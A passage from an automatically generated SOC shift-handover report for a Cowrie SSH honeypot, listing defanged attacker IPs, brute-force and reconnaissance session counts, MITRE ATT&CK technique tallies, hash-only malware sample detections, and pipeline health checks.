| `2026-06-09 18:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `128.199.25[.]179` | **416** | 2026-06-09 14:58 | 2026-06-09 18:09 | 270m | 0 | `T1592` | 🟠 MEDIUM |
| `143.110.178[.]27` | **279** | 2026-06-09 14:59 | 2026-06-09 18:08 | 235m | 0 | `T1592` | 🟠 MEDIUM |
| `154.70.102[.]114` | **30** | 2026-06-09 16:30 | 2026-06-09 16:55 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.172.196[.]177` | **30** | 2026-06-09 16:28 | 2026-06-09 17:35 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.141.71[.]166` | **20** | 2026-06-09 16:12 | 2026-06-09 16:49 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.81.72[.]185` | **20** | 2026-06-09 16:06 | 2026-06-09 17:13 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `92.204.128[.]218` | **19** | 2026-06-09 15:02 | 2026-06-09 18:07 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `103.67.78[.]49` | **16** | 2026-06-09 16:34 | 2026-06-09 16:53 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.26.36[.]195` | **11** | 2026-06-09 14:59 | 2026-06-09 15:18 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `148.66.132[.]204` | **10** | 2026-06-09 17:43 | 2026-06-09 18:07 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.196.119[.]108` | **8** | 2026-06-09 14:58 | 2026-06-09 15:08 | 12m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.166.182[.]155` | **2** | 2026-06-09 16:39 | 2026-06-09 16:42 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.127.195[.]188` | **2** | 2026-06-09 15:14 | 2026-06-09 15:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `209.99.189[.]174` | **2** | 2026-06-09 17:45 | 2026-06-09 17:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]134` | 1 | 2026-06-09 15:23 | 2026-06-09 15:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.46[.]38` | 1 | 2026-06-09 16:18 | 2026-06-09 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-06-09 17:22 | 2026-06-09 17:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.38.37[.]210` | 1 | 2026-06-09 15:27 | 2026-06-09 15:28 | 43s | 0 | `T1592` | 🟢 LOW |
| `117.50.44[.]85` | 1 | 2026-06-09 16:24 | 2026-06-09 16:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `12.179.20[.]195` | 1 | 2026-06-09 17:08 | 2026-06-09 17:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `129.121.33[.]174` | 1 | 2026-06-09 15:07 | 2026-06-09 15:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.97.77[.]182` | 1 | 2026-06-09 16:17 | 2026-06-09 16:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.223.235[.]44` | 1 | 2026-06-09 15:08 | 2026-06-09 15:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]104` | 1 | 2026-06-09 15:09 | 2026-06-09 15:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.219.93[.]108` | 1 | 2026-06-09 15:51 | 2026-06-09 15:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.12.41[.]6` | 1 | 2026-06-09 18:06 | 2026-06-09 18:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.81.140[.]174` | 1 | 2026-06-09 17:00 | 2026-06-09 17:01 | 85s | 0 | `T1592` | 🟢 LOW |
| `213.166.84[.]54` | 1 | 2026-06-09 16:22 | 2026-06-09 16:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.129.37[.]92` | 1 | 2026-06-09 18:02 | 2026-06-09 18:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.247.218[.]112` | 1 | 2026-06-09 15:06 | 2026-06-09 15:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.33.97[.]119` | 1 | 2026-06-09 16:28 | 2026-06-09 16:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.75.213[.]171` | 1 | 2026-06-09 16:00 | 2026-06-09 16:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-06-09 15:56 | 2026-06-09 15:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]147` | 1 | 2026-06-09 16:28 | 2026-06-09 16:28 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `90.230.115[.]5` | SE | Telia Network Services | **100** ⚠️ | 24 |
| `106.13.46[.]38` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 16 |
| `185.223.235[.]44` | NL | Infrawatch Limited | **100** ⚠️ | 12 |
| `172.172.196[.]177` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `61.75.213[.]171` | KR | Korea Telecom | **100** ⚠️ | 4 |
| `14.97.77[.]182` | IN | TATA TELESERVICES LTD - TATA INDICOM - CDMA DIVISION | **100** ⚠️ | 50 |
| `12.179.20[.]195` | US | AT&T Enterprises, LLC | **100** ⚠️ | 0 |
| `129.121.33[.]174` | BR | Oso Grande IP Services, LLC | **100** ⚠️ | 8 |
| `104.152.52[.]134` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 252 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 148 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 97 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 47 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 47 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1022 cases |
| Tool 34  | Credential Extractor        | ✅ 245 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 51 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 97 priority case(s) shown individually · 34 recon entry/entries in table (14 group(s) consolidating 865 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T18:10:45Z_
